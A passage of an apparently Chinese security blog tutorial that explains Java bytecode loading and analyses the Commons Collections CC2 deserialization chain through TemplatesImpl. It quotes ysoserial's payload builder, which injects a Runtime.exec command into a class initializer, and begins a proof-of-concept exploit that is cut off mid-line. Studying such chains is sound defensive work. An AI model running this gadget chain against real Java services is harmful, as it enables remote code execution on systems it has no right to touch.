class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以看到，通过<code>URLClassLoader.newInstance()</code>，创建一个新的URLClassLoader类，而这个URLClassLoader类，只能从<code>urls</code>变量对应的URL中加载字节码文件。</p><p>然后通过<code>loader.loadClass(&quot;Hello&quot;)</code>这段代码加载了Hello.class文件，也就是将这个类Class对象赋值给了变量c，这里等效于创建了一个反射，使用了ClassforName()函数。</p><p>所以后面使用c.newInstance()函数来创建对象。</p><h3 id="利用-ClassLoader-defineClass-直接加载字节码："><a href="#利用-ClassLoader-defineClass-直接加载字节码：" class="headerlink" title="利用 ClassLoader#defineClass 直接加载字节码："></a>利用 ClassLoader#defineClass 直接加载字节码：</h3><p>实际上，不管是远程加载class文件，还是本地加载class或是jar文件，Java中经历的都是下面这三个方法的调用过程：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230514160245795.png" alt="image-20230514160245795"></p><p>也就是在ClassLoader类中，有三个函数的调用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">loadClass()-&gt;findClass()-&gt;defineClass()</span><br></pre></td></tr></table></figure><p>这三个函数的作用是：</p><ol><li><code>loadClass()</code>从已经加载的类缓存、父加载器等位置寻找类（其实就是双亲委派机制），在前面没有找到的情况下执行findClass</li><li><code>findClass()</code>根据基础URL指定的方法来加载类的字节码，可能会在本地文件系统，jar包，或是远程http服务器上读取字节码，然后交给下一个函数defineClass()</li><li><code>defineClass()</code>的作用就是处理前面传入的字节码，将其处理为真正的Java类。</li></ol><p>也就是说，整个字节码的加载过程中，最关键的部分其实是<code>ClassLoader#defineClass()</code>，正是这个方法决定了如何将一段字节流转变为一个Java类，Java默认的ClassLoader#defineClass是一个native方法，逻辑写在JVM的C语言代码中。</p><p>在这里，P神给了一个展示原理的代码：</p><p>这里首先要说明的是，<code>defineClass()</code>是一个受保护的方法，所以不能直接进行调用，必须要通过反射的方式来进行调用。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloDefineClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span>ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class,<span class="type">byte</span>[].class,<span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] code =Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEA</span></span><br><span class="line"><span class="string">Bjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVs</span></span><br><span class="line"><span class="string">bG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZh</span></span><br><span class="line"><span class="string">L2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3Ry</span></span><br><span class="line"><span class="string">ZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5n</span></span><br><span class="line"><span class="string">OylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoA</span></span><br><span class="line"><span class="string">AAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">hello</span> <span class="operator">=</span>(Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Hello&quot;</span>, code,<span class="number">0</span>, code.length);</span><br><span class="line">hello.newInstance();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里通过反射，获取了ClassLoader类中的defineClass方法，然后调用这个方法，通过字符串的形式加载了这个类，也就是hello.class。</p><p>随后，通过newInstance()新建实例化。</p><p>在调用defineClass()这个方法时 ，里面的参数应该这么理解：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230514175849778.png" alt="image-20230514175849778"></p><p>也就是说，在上述代码中，我们调用的方法参数意义应该是；</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), &quot;Hello&quot;, code,0, code.length);</span><br></pre></td></tr></table></figure><p><code>ClassLoader.getSystemClassLoader</code>是我们给的一个系统类加载器，也就是应用程序类加载器，当我们调用defineClass()函数加载字节码的时候，我们时可以选择一个类加载器的。</p><p><code>Hello</code>是我们要定义的类的全限定名</p><p><code>code</code>是我们要定义的类的字节码数组</p><p>0是字节数组的起始位置</p><p><code>code.length</code>是我们传入的字节数组的长度。</p><p><strong>需要注意的是：</strong>在defineClass被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用器构造函数，初始化代码才能能被执行。</p><p>而且，即使是将初始化代码放在类的static块中，在<code>defineClass()</code>时候，也无法被直接调用到，因此如果我们想要使用defineClass在目标机上面执行任意代码，就需要想办法调用构造函数。</p><p>比如，使用newInstance()函数。</p><p>在实际场景中，因为defineClass方法作用域是不开放的，搜易攻击者很少能够直接利用到它，但是它是我们常用的一个攻击链<code>TemplatesImpl</code>的基础。</p><p>就像是我们现在看到的CC2链条一样。</p><h3 id="利用TemplatesImpl加载字节码："><a href="#利用TemplatesImpl加载字节码：" class="headerlink" title="利用TemplatesImpl加载字节码："></a>利用TemplatesImpl加载字节码：</h3><p>虽然大部分的开发者不会用到<code>defineClass()</code>方法，但是很少见的，在Java的一个底层类中，运用到了这个方法，也就是我们现在正在学习的<code>TemplatesImpl</code>类。</p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p><p>这个类中，定义了一个内部类，<code>TransletClassLoader</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line"></span><br><span class="line">         TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">             <span class="built_in">super</span>(parent);</span><br><span class="line">            _loadedExternalExtensionFunctions = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;</span><br><span class="line">            <span class="built_in">super</span>(parent);</span><br><span class="line">            _loadedExternalExtensionFunctions = mapEF;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">            Class&lt;?&gt; ret = <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">// The _loadedExternalExtensionFunctions will be empty when the</span></span><br><span class="line">            <span class="comment">// SecurityManager is not set and the FSP is turned off</span></span><br><span class="line">            <span class="keyword">if</span> (_loadedExternalExtensionFunctions != <span class="literal">null</span>) &#123;</span><br><span class="line">                ret = _loadedExternalExtensionFunctions.get(name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ret == <span class="literal">null</span>) &#123;</span><br><span class="line">                ret = <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到这个内部类的最后对defineClass方法进行了一次重写，在这里，defineClass方法没有显式的声明其定义域，其作用域就是为default，也就是说这里的defineClass尤其父类的protected类型编程了一个default类型的方法，可以被类外部调用。</p><p>从<code>TransletClassLoader#defineClass()</code>向前看一下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line">-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230521182631741.png" alt="image-20230521182631741"></p><p>在最前面的两个方法，<code>getOutputProperties()</code>和<code>newTransformer()</code>的作用域是public，可以被外部调用。</p><p>当我们执行到这条调用链的最后一步的时候，可以发现是通过对象loader来调用的<code>defineClass()</code>函数，这里调用的参数是<code>_bytecodes[i]</code>。</p><p>这里看一下defineClass()函数中，</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>可以发现上面传入的<code>_bytecodes[i]</code>就是这里的参数b，也就是使用defineClass()来进行加载的字节码。</p><p>也就是说，我们可以通过反射的方式来对<code>_bytecodes</code>这个byte数组进行赋值，然后让其中的一个元素是我们构造的字节码就可以了。</p><p>这里需要注意的是在defineClass()函数中，第一个参数是null，这里就是代表直接使用字节码中的默认类名。</p><p>在P神给出的POC中，我们可以看到他设置了这么几个变量：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230517002810205.png" alt="image-20230517002810205"></p><ol><li>bytecodes 是由字节码组成的数组； </li><li>_name 可以是任意字符串，只要不为null即可；</li><li><code>_tfactory</code> 需要是一个 <code>TransformerFactoryImpl</code> 对象，因为<code>TemplatesImpl#defineTransletClasses()</code> 方法里有调用到<code>_tfactory.getExternalExtensionsMap()</code> ，如果是null会出错。</li></ol><p>至于原因，首先是</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230517003008577.png" alt="image-20230517003008577"></p><p>这里，我们要继续链，就不能让<code>_name</code>为null</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230517003408424.png" alt="image-20230517003408424"></p><p>这里，因为我们创建一个新的TransletClassLoader类的时候，需要调用到方法，所以_tfactory有不能是null。</p><p><strong>还有一个值得注意的点</strong></p><p>另外，值得注意的是， TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须<br>是 <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> 的子类。</p><p>所以在获取字节码的时候必须要保证我们构造的类是AbstractTranslet的子类。</p><h3 id="Javassit库："><a href="#Javassit库：" class="headerlink" title="Javassit库："></a>Javassit库：</h3><p>Javassist是一个开源的分析、编辑和创建Java字节码的类库，可以直接编辑和生成Java生成的字节码。<br> 能够在运行时定义新的Java类，在JVM加载类文件时修改类的定义。<br> Javassist类库提供了两个层次的API，源代码层次和字节码层次。源代码层次的API能够以Java源代码的形式修改Java字节码。字节码层次的API能够直接编辑Java类文件。</p><p>向Maven的<code>Pom.xml</code>文件中，添加以下字段，以导入依赖：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/javassist/javassist --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.12.1.GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230517234943449.png" alt="image-20230517234943449"></p><p>在这个包中，主要调用到的方法是:</p><h4 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool:"></a>ClassPool:</h4><p>ClassPool是CtClass对象的容器，它按需读取类文件来构造CtClass对象，并且保存CtClass对象以便以后使用，其中键名是类名称，值是表示该类的CtClass对象。</p><p>常用方法：</p><ul><li><code>static ClassPool getDefault()</code>：返回默认的ClassPool，一般通过该方法创建我们的ClassPool；</li><li><code>ClassPath insertClassPath(ClassPath cp)</code>：将一个ClassPath对象插入到类搜索路径的起始位置；</li><li><code>ClassPath appendClassPath</code>：将一个ClassPath对象加到类搜索路径的末尾位置；</li><li><code>CtClass makeClass</code>：根据类名创建新的CtClass对象；</li><li><code>CtClass get(java.lang.String classname)</code>：从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用；</li></ul><h4 id="CtClass："><a href="#CtClass：" class="headerlink" title="CtClass："></a><strong>CtClass：</strong></h4><p> CtClass类表示一个class文件，每个CtClass对象都必须从ClassPool中获取。</p><p>常用方法：</p><ul><li><code>void setSuperclass(CtClass clazz)</code>：更改超类，除非此对象表示接口；</li><li><code>byte[] toBytecode()</code>：将该类转换为类文件；</li><li><code>CtConstructor makeClassInitializer()</code>：制作一个空的类初始化程序（静态构造函数）；</li></ul><h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><p>获取字节码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(com.classloader.TemplatesImplEvil.class.getName());</span><br><span class="line"><span class="type">byte</span>[] code = clazz.toBytecode();</span><br></pre></td></tr></table></figure><p>创建一个新类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javassit_test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">createPerson</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//实例化一个ClassPool容器</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//新建一个CtClass，类名为Cat</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="comment">//设置一个要执行的命令</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;System.out.println(\&quot;javassit_test succes!\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">//制作一个空的类初始化，并在前面插入要执行的命令语句</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="comment">//重新设置一下类名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">//将生成的类文件保存下来</span></span><br><span class="line">        cc.writeFile();</span><br><span class="line">        <span class="comment">//加载该类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> cc.toClass();</span><br><span class="line">        <span class="comment">//创建对象</span></span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            createPerson();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="关于调用方式2的TemplatesImpl利用链分析："><a href="#关于调用方式2的TemplatesImpl利用链分析：" class="headerlink" title="关于调用方式2的TemplatesImpl利用链分析："></a>关于调用方式2的TemplatesImpl利用链分析：</h3><p>这条调用链，在前面部分都是一样，主要的区别是从</p><blockquote><p>InvokerTransformer.transform()</p></blockquote><p>开始的。</p><p>InvokerTransformer这个类，最关键的就是它的transform()函数，这个里面通过反射的方式完成了代码执行，这里我们首先看清楚这里调用的是哪一个方法。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230518173043146.png" alt="image-20230518173043146"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230518173052804.png" alt="image-20230518173052804"></p><p>在这里，我们可以发现，虽然一开始在实例化类的时候，这里写的是<code>toString()</code>方法，但是后面，通过反射的方式，将这里的方法名改成了<code>newTransformer</code>。也就是说，我们调用的是<code>newTransformer()</code>方法。</p><p>那么，我们调用的是哪个类中的<code>newTransformer()</code>方法呢。</p><p>因为InvokerTransformer#transoform()是反射传入的input参数，这里我们就需要知道传入的参数是哪个。</p><p>在我们之前的分析中，可以知道传入的参数是来自这里：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230518173514113.png" alt="image-20230518173514113"></p><p>第一个i是整形，后面的是queue数组中的一个元素。</p><p>也就是说这里，其实我们反射的input就是<code>queue[i]</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230518173710958.png" alt="image-20230518173710958"></p><p>这里可以看到，ysoserial通过反射的方式，修改了数组的第一个元素，为templates。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230518173818879.png" alt="image-20230518173818879"></p><p>也就是，我们调用的是templates这个对象中的newTransformer方法。</p><p>跟入：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230519000006975.png" alt="image-20230519000006975"></p><p>可以看到，这里如果if中判定条件为true，则调用一个被重载过的createTemplatesImpl方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">T</span> <span class="variable">templates</span> <span class="operator">=</span> tplClass.newInstance();<span class="comment">//创建了一个org.apache.xalan.xsltc.trax.TemplatesImpl的实例对象</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// use template gadget class</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault(); <span class="comment">//创建一个ClassPool实例，默认方式</span></span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(StubTransletPayload.class)); <span class="comment">//将内部类StubTransletPayload添加入路径</span></span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(abstTranslet));<span class="comment">//同上，但是这里是org.apache.xalan.xsltc.runtime.AbstractTranslet</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(StubTransletPayload.class.getName());<span class="comment">//获取对应类的CtClass对象。</span></span><br><span class="line">        <span class="comment">// run command in static initializer</span></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">            command.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">            <span class="string">&quot;\&quot;);&quot;</span>; <span class="comment">//定义指令</span></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);<span class="comment">//创建一个新的空初始化程序，添加静态程序块，像静态程序块中添加上述代码</span></span><br><span class="line">        <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">        clazz.setName(<span class="string">&quot;ysoserial.Pwner&quot;</span> + System.nanoTime());<span class="comment">//修改类名，类名中包含系统的纳秒级别时间，避免冲突</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(abstTranslet.getName());<span class="comment">//同上，但是这里是org.apache.xalan.xsltc.runtime.AbstractTranslet</span></span><br><span class="line">        clazz.setSuperclass(superC);<span class="comment">//将superC设置为clazz的父类</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = clazz.toBytecode();<span class="comment">//获取字节码</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// inject class bytes into instance</span></span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;</span><br><span class="line">            classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">        &#125;);<span class="comment">//反射方式，将字节码注入，就像我们之前的分析一样。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);<span class="comment">//随便设置一个字符串，不是null即可</span></span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance());<span class="comment">//同分析</span></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过上述代码分析，这里我们可以发现，我们已经成功的将<code>org.apache.xalan.xsltc.trax.TemplatesImpl</code>的字节码注入到了TemplatesImpl的defineClass()方法中，进行动态字节码加载。</p><p>且，这个类的父类是<code>org.apache.xalan.xsltc.runtime.AbstractTranslet</code>。</p><p>也就是说，这里我们调用函数返回的templates是一个特殊的<code>org.apache.xalan.xsltc.trax.TemplatesImpl</code>类。</p><p>回到之前，<code>InvokerTransformeri#transform()</code>，这里就是调用的上述类的<code>newTransformer()</code>方法。</p><p>这里，就回到了我们TemplatesImpl类调用的入口了。</p><p>随后，它会完成我们给他注入的字节码，然后开始调用其内部的static代码块，也就是这一部分：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230519011659850.png" alt="image-20230519011659850"></p><p>完成rce。</p><p><strong>这里还有个小问题：</strong></p><p>我们知道，使用这种加载字节码的方式，在没有newInstance()的时候，是不会运行静态代码块中的内容的，这里是怎么做到的运行我们写的代码的？</p><p>以及为什么要将字节码的父类设为<code>org.apache.xalan.xsltc.runtime.AbstractTranslet</code>。</p><p>这两个问题其实可以一起解决：</p><p>这是因为，在<code>defineTransletClasses()</code>中，也就是我们调用load.defineClass()的部分，</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230519013418964.png" alt="image-20230519013418964"></p><p>这里，会获取我们注入字节码，创建的类的父类。</p><p>如果父类是<code>ABSTRACT_TRANSLET</code>则将<code>_transletIndex</code>设为<code>i</code>。</p><p>这里即不会报错，同时，当函数执行结束，会返回到上一部分，也就是<code>getTransletInstance()</code>方法中。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230519013700056.png" alt="image-20230519013700056"></p><p>这里，会使用到我们之前得到的<code>_transletIndex</code>就会完成<code>newInstance()</code>，随后即可调用static方法中的函数了。</p><p>也就是说，需要上述两个条件，是为了满足父类的要求，设置_transletIndex，然后完成newInstance()。</p><h3 id="TemplatesImpl链POC："><a href="#TemplatesImpl链POC：" class="headerlink" title="TemplatesImpl链POC："></a>TemplatesImpl链POC：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC2</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//反射,设置comparator,InvokerTransformer中方法为newTransformer</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(queue, comparator);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> InvokerTransformer.class.getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">            field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field1.set(invokerTransformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException | ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">//创建类字节码和恶意指令</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class));</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">poc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Poc&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span 